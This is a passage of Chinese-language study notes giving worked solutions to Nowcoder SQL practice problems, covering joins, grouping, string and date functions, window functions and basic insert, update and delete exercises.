(nowcoder.com)](https://www.nowcoder.com/practice/5400df085a034f88b2e17941ab338ee8?tpId=199&tqId=1975675&ru=/practice/88aa923a9a674253b861a8fa56bac8e5&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n 问题分解：\n\n- 每个学校：按学校分组`group by university`\n- 不同难度：按难度分组`group by difficult_level`\n- 平均答题数：总答题数除以总人数`count(qpd.question_id) / count(distinct qpd.device_id)`\n- 来自上面信息三个表，需要联表，t1与t2用device_id连接，t3与t2用question_id连接。\n\n```sql\nSELECT \n\t\tt1.university,\n\t\tt3.difficult_level,\n\t\tROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id), 4) AS avg_answer_cnt\nFROM question_practice_detail AS t2\nLEFT JOIN user_profile AS t1\nON t1.device_id = t2.device_id\nLEFT JOIN question_detail AS t3\nON t3.question_id = t2.question_id\nGROUP BY t1.university, t3.difficult_level\n```\n\n题解2:\n\n```sql\nSELECT \n    t1.university,\n    t3.difficult_level,\n    ROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id),4) AS avg_answer_cnt\nFROM \n    user_profile t1,\n    question_practice_detail t2,\n    question_detail t3\nWHERE\n    t1.device_id = t2.device_id\n    and \n    t2.question_id = t3.question_id\nGROUP BY t1.university,t3.difficult_level;\n```\n\n#### SQL24 统计每个用户的平均刷题数-INNER JOIN\n\n题目地址：[统计每个用户的平均刷题数_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/f4714f7529404679b7f8909c96299ac4?tpId=199&tqId=1975676&ru=/ta/sql-quick-study&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT \n    t1.university,\n    t3.difficult_level,\n    ROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id),4) AS avg_answer_cnt\nFROM \n    user_profile AS t1,\n    question_practice_detail AS t2,\n    question_detail AS t3\nWHERE\n    t1.device_id = t2.device_id\n    and\n    t2.question_id = t3.question_id\n    and\n    university =\"山东大学\"\nGROUP BY  t3.difficult_level\n```\n\n题解2:\n\n```sql\nSELECT \n    university,\n    difficult_level,\n    ROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id),4) AS avg_answer_cnt\nFROM question_practice_detail AS t2\nINNER JOIN user_profile AS t1\nON t1.device_id = t2.device_id AND t1.university=\"山东大学\"\nINNER JOIN question_detail AS t3\nON t3.question_id = t2.question_id\nGROUP BY difficult_level\n```\n\n#### SQL25 查找山东大学或者性别为男生的信息-UNION ALL\n\n题目地址：[查找山东大学或者性别为男生的信息_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/979b1a5a16d44afaba5191b22152f64a?tpId=199&tqId=1975677&ru=/practice/f4714f7529404679b7f8909c96299ac4&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n- 限定条件：学校为山东大学或者性别为男性的用户：`university='山东大学'`, `gender='male'`；\n- 分别查看&结果不去重：所以直接使用两个条件的or是不行的，直接用union也不行，要用union all，分别去查满足条件1的和满足条件2的，然后合在一起不去重\n\n- 默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL\n\n```sql\nSELECT device_id,gender,age,gpa\nFROM user_profile\nWHERE university='山东大学'\nUNION ALL\nSELECT device_id, gender, age, gpa\nFROM user_profile\nWHERE gender='male'\n```\n\n### 05-必会的常用函数\n\n#### SQL26 计算25岁以上和以下的用户数量-IF、COUNT(*)\n\n题目地址：[计算25岁以上和以下的用户数量_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/30f9f470390a4a8a8dd3b8e1f8c7a9fa?tpId=199&tqId=1975678&ru=/practice/979b1a5a16d44afaba5191b22152f64a&qru=/ta/sql-quick-study/question-ranking)\n\n**CASE函数**\n\n是一种多分支的函数，可以根据条件列表的值返回多个可能的结果表达式中的一个。可用在任何允许使用表达式的地方，但不能单独作为一个语句执行。\n\n```sql\nCASE\nWHEN 布尔表达式1 THEN 结果表达式1\nWHEN 布尔表达式2 THEN 结果表达式2 …\nWHEN 布尔表达式n THEN 结果表达式n\n[ ELSE 结果表达式n+1 ]\nEND\n```\n\n**IF函数**\n\n```\nIF( expr1 , expr2 , expr3 )\n```\n\n- expr1 的值为 TRUE，则返回值为 expr2 \n- expr1 的值为FALSE，则返回值为 expr3\n\n题解1:\n\n```sql\nSELECT CASE \n        WHEN age < 25 OR age is null THEN '25岁以下'\n        WHEN age >= 25 THEN '25岁及以上'\n\t\t\t\tEND age_cut,COUNT(*) AS number\nFROM user_profile\nGROUP BY age_cut\n```\n\n题解2:\n\n```sql\nSELECT CASE \n        WHEN age >= 25 THEN '25岁及以上'\n        ELSE '25岁以下'\n\t\t\t\tEND age_cut,COUNT(*) AS number\nFROM user_profile\nGROUP BY age_cut\n```\n\n题解3:\n\n```sql\nSELECT IF(age >= 25,\"25岁及以上\",\"25岁以下\") AS age_cut,count(*) AS number\nFROM user_profile\nGROUP BY age_cut;\n```\n\n#### SQL27 查看不同年龄段的用户明细-CASE\n\n题目地址：[查看不同年龄段的用户明细_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/ae44b2b78525417b8b2fc2075b557592?tpId=199&tqId=1975679&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解：\n\n```sql\nSELECT \n    device_id,\n    gender,\n    CASE \n        WHEN age >= 25 THEN \"25岁及以上\"\n        WHEN age < 20 THEN \"20岁以下\"\n        WHEN 20 <= age <= 24 THEN \"20-24岁\"\n         ELSE \"其他\"\n    END AS age_cut\nFROM user_profile\n```\n\n#### SQL28 计算用户8月每天的练题数量-YEAR\n\n题目地址：[计算用户8月每天的练题数量_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/847373e2fe8d47b4a2c294bdb5bda8b6?tpId=199&tqId=1975680&ru=/practice/ae44b2b78525417b8b2fc2075b557592&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT DAY(date) AS day,COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE YEAR(date)=\"2021\" and MONTH(date)=\"08\"\nGROUP BY day\n```\n\n#### SQL29 计算用户的平均次日留存率-DATE_ADD\n\n题目地址：[计算用户的平均次日留存率_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/126083961ae0415fbde061d7ebbde453?tpId=199&tqId=1975680&ru=%2Fpractice%2Fae44b2b78525417b8b2fc2075b557592&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\n题解：\n\n次日留存率 = 去重的数据表中符合次日留存的条目数目 / 去重的数据表中所有条目数目\n\n```sql\nSELECT \n    COUNT(t2.device_id) / COUNT(t1.device_id) AS avg_ret \nFROM \n    (SELECT DISTINCT device_id, date FROM question_practice_detail)as t1\nLEFT JOIN\n    (SELECT DISTINCT device_id, date FROM question_practice_detail) AS t2\nON t1.device_id = t2.device_id AND t2.date = DATE_ADD(t1.date, interval 1 day)\n```\n\n#### SQL30 统计每种性别的人数-substring_index\n\n题目地址：[统计每种性别的人数_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/f04189f92f8d4f6fa0f383d413af7cb8?tpId=199&tqId=1975682&ru=/practice/126083961ae0415fbde061d7ebbde453&qru=/ta/sql-quick-study/question-ranking)\n\n**substring_index函数**\n\n```sql\nsubstring_index(str,delim,count)\n```\n\n- str:要处理的字符串\n- delim:分隔符\n- count:计数\n\n```sql\nstr = 'www.wikidm.cn'\n\n//取前面\nsubstring_index(str,'.',1)\n结果是：www\n\nsubstring_index(str,'.',2)\n结果是：www.wikidm\n\n//取后面\nsubstring_index(str,'.',-1)\n结果为：cn\n\nsubstring_index(str,'.',-2)\n结果为：wikidm.cn\n\n//取中间\nsubstring_index(substring_index(str,'.',-2),'.',1);\n结果为：wikidm\n```\n\n题解1:\n\n```sql\nSELECT  substring_index(profile,',',-1) AS gender,  COUNT(*) AS number\nFROM user_submit\nGROUP BY gender\n```\n\n题解2：\n\n```sql\nSELECT  CASE \n    WHEN `profile` LIKE \"%,male\" THEN 'male'\n    WHEN `profile` LIKE \"%,female\" THEN 'female'\n    END AS gender,  COUNT(device_id) AS number\nFROM user_submit\nGROUP BY gender\n```\n\n题解3:\n\n```sql\nSELECT IF(profile LIKE '%female','female','male') gender,COUNT(*) number\nFROM user_submit\nGROUP BY gender;\n```\n\n#### SQL32 截取出年龄-SUBSTR\n\n题目地址：[截取出年龄_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/b8d8a87fe1fc415c96f355dc62bdd12f?tpId=199&tqId=1975684&ru=/practice/26c8715f32e24d918f15db69518f3ad8&qru=/ta/sql-quick-study/question-ranking)\n\n题解1：\n\n```sql\nSELECT \n    SUBSTRING_INDEX(SUBSTRING_INDEX(profile,',',-2),',',1) AS age,\n    COUNT(*) AS number \nFROM user_submit\nGROUP BY age\n```\n\n**SUBSTR函数**\n\n截取字符串\n\n```sql\nsubstr(string str,num start,num length);\n```\n\n- str为字符串；\n- start为起始位置；\n- length为长度。\n\n题解2:\n\n```sql\nSELECT\n    SUBSTR(profile,12,2) AS age,\n    COUNT(*) AS number\nFROM user_submit\nGROUP BY age\n```\n\n#### SQL31 提取博客URL中的用户名-replace\n\n题目地址：[提取博客URL中的用户名_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/26c8715f32e24d918f15db69518f3ad8?tpId=199&tqId=1975683&ru=/practice/90778f5ab7d64d35a40dc1095ff79065&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT\n# 替换法 replace(string, '被替换部分','替换后的结果')\n  device_id, replace(blog_url,'http:/url/','') as user_name\n \n# 删除法 trim('被删除字段' from 列名)\n# device_id, trim('http:/url/' from blog_url) as user_name\n \n# 截取法 substr(string, start_point, length*可选参数*)\n# device_id, substr(blog_url,11,length(blog_url)-10) as user_nam\n\n# 字段切割法 substring_index(string, '切割标志', 位置数（负号：从后面开始）)\n# device_id, substring_index(blog_url,'/',-1) as user_name\n \nFROM user_submit\n```\n\n#### SQL33 找出每个学校GPA最低的同学\n\n题目地址：[找出每个学校GPA最低的同学_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/90778f5ab7d64d35a40dc1095ff79065?tpId=199&tqId=1980672&ru=/practice/b8d8a87fe1fc415c96f355dc62bdd12f&qru=/ta/sql-quick-study/question-ranking)\n\n题解1：用 group by 把学校分组，然后计算得到每个学校最低 gpa，再去找这个学校里和这个 gpa 相等的同学 device_id\n\n```sql\nSELECT device_id,university,gpa\nFROM user_profile\nWHERE (university,gpa) \n    IN (SELECT university,MIN(gpa) FROM user_profile GROUP BY university)\nORDER BY university ASC\n```\n\n题解2:窗口函数\n\n```sql\n<窗口函数> over (partition by <用于分组的列名>\n                order by <用于排序的列名>)\n```\n\n窗口函数语法：[通俗易懂的学会：SQL窗口函数](https://zhuanlan.zhihu.com/p/92654574)\n\n```sql\nSELECT device_id,university,gpa\nFROM (SELECT *,rank() over (partition by university\n                order by gpa) AS rk FROM user_profile)  AS uni_min\nWHERE uni_min.rk=1\nORDER BY university \n```\n\n### 06-综合练习\n\n#### SQL34 统计复旦用户8月练题情况-SUM、IF\n\n题目地址：[统计复旦用户8月练题情况_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/53235096538a456b9220fce120c062b3?tpId=199&tqId=1980673&ru=/practice/b8f30b239b454ed490367b53ea95607d&qru=/ta/sql-quick-study/question-ranking)\n\n题解：\n\n```sql\nSELECT\n    t1.device_id,\n    t1.university,\n    SUM(IF(result IS NOT NULL, 1, 0)) AS questino_cnt,\n    SUM(IF(t2.result = \"right\",1,0)) AS right_question_cnt\nFROM \n    user_profile AS t1\n    LEFT JOIN question_practice_detail AS t2\n    ON t1.device_id = t2.device_id AND MONTH(t2.date) = 8\nWHERE  university = \"复旦大学\"\nGROUP BY t1.device_id;\n```\n\n#### SQL35 浙大不同难度题目的正确率-SUM、IF\n\n题目地址：\n\n题解：[题解 | #浙大不同难度题目的正确率#_牛客博客 (nowcoder.net)](https://blog.nowcoder.net/n/7d54ab4a35994b0790b76a5de8b98369)\n\n```sql\nSELECT\n    difficult_level,\n    sum(if(t2.result='right', 1, 0)) / count(t2.question_id) as correct_rate\nFROM \n    user_profile AS t1\n    INNER JOIN question_practice_detail AS t2\n    ON t1.device_id = t2.device_id \n    INNER JOIN question_detail AS t3\n    ON t2.question_id = t3.question_id \nWHERE  university = \"浙江大学\"\nGROUP BY difficult_level\nORDER BY correct_rate\n```\n\n#### SQL39 21年8月份练题总数-date_format\n\n题目地址：[21年8月份练题总数_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/b8f30b239b454ed490367b53ea95607d?tpId=199&tqId=2002640&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\n题解1：date_format\n\n```sql\nSELECT \n    COUNT(DISTINCT device_id) AS did_cnt,\n    COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE date_format(date, '%Y-%m')='2021-08'\n```\n\n题解2：YEAR、MONTH\n\n```sql\nSELECT \n    COUNT(DISTINCT device_id) AS did_cnt,\n    COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE YEAR(date) = 2021 AND MONTH(date) = 08\n```\n\n题解3：LIKE\n\n```sql\nSELECT \n    COUNT(DISTINCT device_id) AS did_cnt,\n    COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE date LIKE \"2021-08%\"\n```\n\n## 二、SQL必知必会\n\n- [x] 🌟必知必会篇：50道题\n- [x] 🕸题目地址：[牛客网](https://www.nowcoder.com/exam/oj?tab=SQL篇&topicId=298)\n- [x] 📚配套书籍：[MySQL必知必会（文字版）.pdf](https://jwt1399.lanzouq.com/iqSWa011dw0d)\n- [x] 🚩小简计划：预计3天写完\n- [x] 🎯开始时间：03-04 完成 26 道、03-05 完成 24 道\n- [x] 🎉结束时间：03-05 提前一天完成🥳\n\n### 01-检索数据\n\n#### **SQL1** **从 Customers 表中检索所有的 ID**\n\n题解：\n\n```sql\nSELECT cust_id FROM Customers\n```\n\n#### **SQL2** **检索并列出已订购产品的清单-DISTINCT**\n\n题解：\n\n```sql\nSELECT DISTINCT prod_id FROM OrderItems\n```\n\n#### **SQL3** **仅检索顾客的ID**\n\n题解：\n\n```sql\nSELECT * FROM Customers\n-- SELECT cust_id FROM Customers\n```\n\n### 02-排序检索数据\n\n#### SQL4 检索顾客名称并且排序-DESC\n\n题解：\n\n```sql\nSELECT cust_name FROM Customers ORDER BY cust_name DESC\n```\n\n#### SQL5 对顾客ID和日期排序-DESC\n\n题解：\n\n```sql\nSELECT cust_id,order_num FROM Orders   ORDER BY cust_id,order_date DESC\n```\n\n#### SQL6 按照数量和价格排序-DESC\n\n题解：\n\n```sql\nSELECT quantity,item_price FROM OrderItems ORDER BY quantity DESC,item_price DESC;\n```\n\n#### SQL7 检查SQL语句-DESC\n\n题解：\n\n```sql\nSELECT vend_name \nFROM Vendors \nORDER BY vend_name DESC\n```\n\n### 03-过滤数据\n\n#### **SQL8** **返回固定价格的产品-=**\n\n题解：\n\n```sql\nSELECT prod_id,prod_name\nFROM Products\nWHERE prod_price = 9.49\n```\n\n#### SQL9 返回更高价格的产品->+\n\n题解：\n\n```sql\nSELECT prod_id,prod_name\nFROM Products\nWHERE prod_price >= 9\n```\n\n#### SQL10 返回产品并且按照价格排序-BETWEEN AND\n\n题解：\n\n```sql\nSELECT prod_name,prod_price\nFROM Products\nWHERE prod_price between 3 and 6\nORDER BY prod_price\n```\n\n#### SQL11 返回更多的产品->=\n\n题解：\n\n```sql\nSELECT DISTINCT order_num\nFROM OrderItems\nWHERE quantity >= 100\n```\n\n### 04-高级数据过滤-in\n\n#### SQL12 检索供应商名称-AND\n\n题解：\n\n```sql\nSELECT vend_name\nFROM Vendors\nWHERE vend_country = 'USA'  AND vend_state = 'CA'\n```\n\n#### SQL13 检索并列出已订购产品的清单-IN\n\n题解：\n\n```sql\nSELECT order_num,prod_id,quantity\nFROM OrderItems\nWHERE quantity >= 100 AND prod_id IN ('BR01','BR02','BR03')\nORDER BY prod_id,order_num\n```\n\n#### SQL14 返回所有价格在3美元到6美元之间-BETWEEN AND\n\n题解：\n\n```sql\nSELECT prod_name,prod_price\nFROM Products\nWHERE prod_price BETWEEN 3 AND 6\nORDER BY prod_price\n```\n\n#### SQL15 纠错2-AND\n\n题解：\n\n```sql\nSELECT vend_name \nFROM Vendors \nWHERE vend_country = 'USA' AND vend_state = 'CA'\nORDER BY vend_name \n```\n\n### 05-用通配符进行过滤-like\n\n#### SQL16 检索产品名称和描述（一）-LIKE\n\n题解：\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc LIKE \"%toy\"\n```\n\n#### SQL17 检索产品名称和描述（二）-LIKE\n\n题解：\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc NOT LIKE \"%toy\"\nORDER BY prod_name\n```\n\n#### SQL18 检索产品名称和描述（三）-LIKE\n\n题解：\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc LIKE \"%toy%\" AND prod_desc LIKE \"%carrots%\"\n```\n\n#### SQL19 检索产品名称和描述（四）-LIKE\n\n题解：\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc LIKE \"%toy%carrots%\"\n```\n\n### 06-创建计算字段\n\n#### SQL20 别名-AS\n\n题解：\n\n```sql\nSELECT vend_id,vend_name AS vname,vend_address AS vaddress,vend_city AS vcity\nFROM Vendors \nORDER BY vname\n```\n\n#### SQL21 打折-AS\n\n题解：\n\n```sql\nSELECT prod_id,prod_price,(prod_price * 0.9) AS sale_price\nFROM Products \n```\n\n### 07-使用函数处理数据\n\n#### SQL22 顾客登录名-concat、substring、upper\n\n题解：\n\n- 字符串的截取：substring(字符串，起始位置，截取字符数）\n- 字符串的拼接：concat(字符串1，字符串2，字符串3,...)\n- 字母大写：upper(字符串）\n\n```sql\nSELECT \n    cust_id,\n    cust_name,\n    upper(concat(substring(cust_name,1,2),substring(cust_city,1,3))) AS user_login\nFROM Customers \n```\n\n#### SQL23 返回 2020 年 1 月的所有订单的订单号和订单日期-date_format\n\n题解1：\n\n```sql\nSELECT order_num,order_date\nFROM Orders \nWHERE YEAR(order_date) = '2020' AND MONTH(order_date) = '1'\nORDER BY order_date\n```\n\n题解2:\n\n```sql\nSELECT order_num,order_date\nFROM Orders \nWHERE date_format(order_date,'%Y-%m')='2020-01'\nORDER BY order_date\n```\n\n### 08-汇总数据-sum、count、max\n\n#### SQL24 确定已售出产品的总数-sum\n\n题解：\n\n```sql\nSELECT  sum(quantity) AS items_ordered\nFROM OrderItems\n```\n\n#### SQL25 确定已售出产品项 BR01 的总数-sum\n\n题解：\n\n```sql\nSELECT sum(quantity) AS items_ordered\nFROM OrderItems\nWHERE prod_id ='BR01'\n```\n\n#### SQL26 确定 Products 表中价格不超过 10 美元的最贵产品的价格-max\n\n题解：\n\n```sql\nSELECT max(prod_price) AS max_price\nFROM Products\nWHERE prod_price <= 10\n```\n\n### 09-分组数据-group by\n\n#### SQL27 返回每个订单号各有多少行数-count\n\n题解：\n\n```sql\nSELECT order_num,count(order_num) AS order_lines\nFROM OrderItems\nGROUP BY order_num\nORDER BY order_lines\n```\n\n#### SQL28 每个供应商成本最低的产品-min\n\n题解：\n\n```sql\nSELECT vend_id, min(prod_price) AS cheapest_item\nFROM Products\nGROUP BY vend_id\nORDER BY cheapest_item\n```\n\n#### SQL29 确定最佳顾客-HAVING\n\n题解：\n\n```sql\nSELECT order_num\nFROM OrderItems\nGROUP BY order_num\nHAVING sum(quantity) >= 100\nORDER BY order_num\n```\n\n#### SQL30 确定最佳顾客的另一种方式（一）-HAVING\n\n题解：\n\n```sql\nSELECT order_num, sum(item_price*quantity) AS total_price\nFROM OrderItems\nGROUP BY order_num\nHAVING  total_price >= 1000\nORDER BY order_num\n```\n\n#### SQL31 纠错3-HAVING\n\n题解：\n\n```sql\nSELECT order_num, COUNT(*) AS items \nFROM OrderItems \nGROUP BY order_num \nHAVING COUNT(*) >= 3 \nORDER BY items, order_num;\n```\n\n### 10-使用子查询\n\n#### SQL32 返回购买价格为 10 美元或以上产品的顾客列表\n\n题解：\n\n```sql\nSELECT cust_id\nFROM Orders \nWHERE order_num in(\n    SELECT order_num \n    FROM OrderItems \n    GROUP BY order_num \n    HAVING  SUM(item_price) >= 10\n)\n```\n\n#### SQL33 确定哪些订单购买了 prod_id 为 BR01 的产品（一）\n\n题解：\n\n```sql\nSELECT cust_id,order_date\nFROM Orders \nWHERE order_num in(\n    SELECT order_num \n    FROM OrderItems \n    WHERE  prod_id = 'BR01'\n    ORDER BY cust_id,order_date\n)\n```\n\n#### SQL34 返回购买 prod_id 为 BR01 的产品的所有顾客的电子邮件（一）\n\n题解：\n\n```sql\nselect cust_email from Customers\nwhere cust_id in (select cust_id from Orders where order_num \nin (select order_num from OrderItems where prod_id='BR01'))\n```\n\n#### SQL35 返回每个顾客不同订单的总金额\n\n题解：\n\n```sql\nselect cust_id, sum(quantity*item_price) total_ordered \nfrom OrderItems AS a, Orders AS b \nwhere a.order_num = b.order_num\ngroup by cust_id\norder by total_ordered desc\n```\n\n#### SQL36 从 Products 表中检索所有的产品名称以及对应的销售总数\n\n题解：\n\n```sql\nselect prod_name, SUM(quantity) quant_sold \nfrom Products AS a, OrderItems AS b \nwhere a.prod_id = b.prod_id\ngroup by prod_name\n```\n\n### 11-联结表-where、join\n\n#### SQL37 返回顾客名称和相关订单号\n\n联结表：\n\n- 1、使用where。 from 表1，表2 where 表1.列名x = 表2.列名x\n- 2、使用inner join。from 表1 inner join 表2 on 表1.列名x=表2.列名x\n\n题解1：\n\n```sql\nSELECT cust_name,order_num\nFROM Customers,Orders\nWHERE Customers.cust_id = Orders.cust_id\nORDER BY cust_name,order_num\n```\n\n题解2:\n\n```sql\nSELECT cust_name,order_num\nFROM Customers AS t1\nINNER JOIN Orders AS t2\nON t1.cust_id = t2.cust_id\nORDER BY cust_name,order_num\n```\n\n#### SQL38 返回顾客名称和相关订单号以及每个订单的总价\n\n题解1：\n\n```sql\nSELECT cust_name,Orders.order_num, sum(quantity*item_price) AS OrderTotal\nFROM Customers,Orders,OrderItems\nWHERE Customers.cust_id = Orders.cust_id AND Orders.order_num = OrderItems.order_num \nGROUP BY cust_name,order_num\nORDER BY cust_name,order_num\n```\n\n题解2：\n\n```sql\nselect cust_name,Orders.order_num,sum(quantity*item_price) as OrderTotal\nfrom Orders\ninner join Customers on Orders.cust_id = Customers.cust_id\ninner join OrderItems on Orders.order_num = OrderItems.order_num\ngroup by cust_name,Orders.order_num\norder by cust_name,Orders.order_num\n```\n\n#### SQL39 确定哪些订单购买了 prod_id 为 BR01 的产品（二）\n\n题解1：\n\n```sql\nSELECT cust_id,order_date\nFROM OrderItems,Orders\nWHERE OrderItems.order_num = Orders.order_num AND prod_id = \"BR01\"\nORDER BY order_date\n```\n\n题解2：\n\n```sql\nSELECT cust_id, order_date\nFROM Orders \nINNER JOIN OrderItems ON OrderItems.order_num = Orders.order_num\nWHERE prod_id = \"BR01\"\nORDER BY order_date \n```\n\n#### SQL40 返回购买 prod_id 为 BR01 的产品的所有顾客的电子邮件（二）\n\n题解1：\n\n```sql\nSELECT cust_email\nFROM OrderItems,Orders,Customers\nWHERE OrderItems.order_num = Orders.order_num \nAND Orders.cust_id = Customers.cust_id AND prod_id = \"BR01\"\nORDER BY order_date\n```\n\n题解2：\n\n```sql\nSELECT cust_email\nFROM Orders \nINNER JOIN OrderItems ON OrderItems.order_num = Orders.order_num\nINNER JOIN Customers ON Orders.cust_id = Customers.cust_id\nWHERE prod_id = \"BR01\"\nORDER BY order_date \n```\n\n#### SQL41 确定最佳顾客的另一种方式（二）\n\n题解：\n\n```sql\nSELECT cust_name,sum(item_price*quantity) AS total_price\nFROM Orders \nINNER JOIN OrderItems ON OrderItems.order_num = Orders.order_num\nINNER JOIN Customers ON Orders.cust_id = Customers.cust_id\nGROUP BY Customers.cust_name\nHAVING total_price >= 1000\nORDER BY total_price \n```\n\n### 12-创建高级联结-Join\n\n#### SQL42 检索每个顾客的名称和所有的订单号（一）\n\n题解：\n\n```sql\nSELECT cust_name,order_num\nFROM Orders \nINNER JOIN Customers ON Customers.cust_id = Orders.cust_id\nORDER BY cust_name\n```\n\n#### SQL43 检索每个顾客的名称和所有的订单号（二）\n\n- 内联结：inner join。取两列的交集。\n- 外联结：\n- - left join。左连接，以左边表的列为主，取两列的交集，对于不在右边列存在的名称取null。\n- - right join。右连接，以右边表的列为主，取两列的交集，对于不在左边列存在的名称取null。\n\n题解：\n\n```sql\nSELECT cust_name,order_num\nFROM Customers \nLEFT JOIN Orders ON Customers.cust_id = Orders.cust_id\nORDER BY cust_name\n```\n\n#### SQL44 返回产品名称和与之相关的订单号\n\n题解：\n\n```sql\nSELECT prod_name,order_num\nFROM Products \nLEFT JOIN  OrderItems ON Products.prod_id = OrderItems.prod_id\nORDER BY prod_name\n```\n\n#### SQL45 返回产品名称和每一项产品的总订单数\n\n题解：\n\n```sql\nSELECT prod_name, COUNT(order_num) AS orders\nFROM Products \nLEFT JOIN  OrderItems ON Products.prod_id = OrderItems.prod_id\nGROUP BY prod_name\nORDER BY prod_name\n```\n\n#### SQL46 列出供应商及其可供产品的数量\n\n```sql\nSELECT Vendors.vend_id,COUNT(prod_id) AS prod_id\nFROM Vendors \nLEFT JOIN  Products ON Products.vend_id = Vendors.vend_id\nGROUP BY vend_id\nORDER BY vend_id\n```\n\n### 13-组合查询-union\n\n#### SQL47 将两个 SELECT 语句结合起来（一）\n\n题解：\n\n```sql\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE quantity = 100\nUNION\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE prod_id LIKE \"BNBG%\"\n```\n\n#### SQL48 将两个 SELECT 语句结合起来（二）\n\n题解：\n\n```sql\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE quantity = 100\nUNION\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE prod_id LIKE \"BNBG%\"\nORDER BY prod_id\n```\n\n#### SQL49 组合 Products 表中的产品名称和 Customers 表中的顾客名称\n\n题解：\n\n```sql\nSELECT prod_name FROM Products\nUNION\nSELECT cust_name FROM Customers\nORDER BY prod_name\n```\n\n#### SQL50 纠错4\n\n题解：\n\n```sql\nSELECT cust_name, cust_contact, cust_email FROM Customers \nWHERE cust_state = 'MI' \n#ORDER BY cust_name; \nUNION \nSELECT cust_name, cust_contact, cust_email FROM Customers \nWHERE cust_state = 'IL'\nORDER BY cust_name;\n```\n\n## 三、SQL进阶篇\n\n- [x] 🌟进阶篇：46道题\n- [x] 🕸题目地址：[牛客网](https://www.nowcoder.com/exam/oj?tab=SQL篇&topicId=240)\n- [x] 🚩小简计划：预计5天写完\n- [x] 🎯开始时间：03-07 13道 03-08 5道\n- [x] 🎉结束时间：03-0x\n\n### 01-增删改操作\n\n#### SQL1 插入记录（一）\n\n题解：\n\n```sql\nINSERT INTO exam_record VALUES(null,1001,9001,'2021-09-01 22:11:12','2021-09-01 23:01:12',90),(null,1002,9002,'2021-09-04 07:01:02',null,null)\n```\n\n#### SQL2 插入记录（二）\n\n- 把一个表的数据插入到另一个表中(指定字段)\n\n```sql\nINSERT  INTO 目标表 (字段1, 字段2, ...) SELECT 字段1, 字段2,... FROM 来源表  [WHERE key=value]\n```\n\n题解：\n\n```sql\nINSERT INTO exam_record_before_2021(uid, exam_id, start_time, submit_time, score)\nSELECT uid, exam_id, start_time, submit_time, score\nFROM exam_record\nWHERE YEAR(submit_time) < '2021';\n```\n\n#### SQL3 插入记录（三）-replace\n\n- replace into 跟 insert into 功能类似\n\n- 不同点在于：replace into 首先尝试插入数据到表中\n\n  - 如果发现表中已经有此行数据（根据主键或者唯一索引判断）则先删除此行数据，然后插入新的数据；\n\n  - 否则，直接插入新数据。\n\n- 要注意的是：插入数据的表必须有主键或者是唯一索引！否则的话，replace into 会直接插入数据，这将导致表中出现重复的数据。\n\n题解1：\n\n```sql\nREPLACE INTO examination_info VALUES(null,9003,\"SQL\",\"hard\",90,\"2021-01-01 00:00:00\")\n```\n\n题解2：\n\n```sql\nDELETE FROM examination_info\nWHERE exam_id=9003;\nINSERT INTO examination_info\nVALUES(NULL,9003, 'SQL','hard', 90, '2021-01-01 00:00:00')\n```\n\n#### SQL4 更新记录（一）\n\n题解：\n\n```sql\nUPDATE examination_info \nSET tag = \"Python\" \nWHERE tag = \"PYTHON\"\n```\n\n#### SQL5 更新记录（二）\n\n题解：\n\n```sql\nUPDATE exam_record \nSET submit_time = \"2099-01-01 00:00:00\",score = 0 \nWHERE start_time < \"2021-09-01\" AND submit_time is null\n```\n\n#### SQL6 删除记录（一）-TIMESTAMPDIFF\n\n时间差函数：\n\n- TIMESTAMPDIFF(interval, time_start, time_end)可计算time_start-time_end的时间差，单位以指定的interval为准，常用可选：\n  - SECOND 秒\n  - MINUTE 分钟（返回秒数差除以60的整数部分）\n  - HOUR 小时（返回秒数差除以3600的整数部分）\n  - DAY 天数（返回秒数差除以3600*24的整数部分）\n  - MONTH 月数\n  - YEAR 年数\n\n题解：\n\n```sql\nDELETE FROM exam_record \nWHERE timestampdiff(minute,start_time,submit_time) < 5 AND score < 60\n```\n\n#### SQL7 删除记录（二）-LIMIT\n\n题解：\n\n```sql\nDELETE FROM exam_record \nWHERE submit_time is null OR timestampdiff(minute,start_time,submit_time) < 5\nORDER 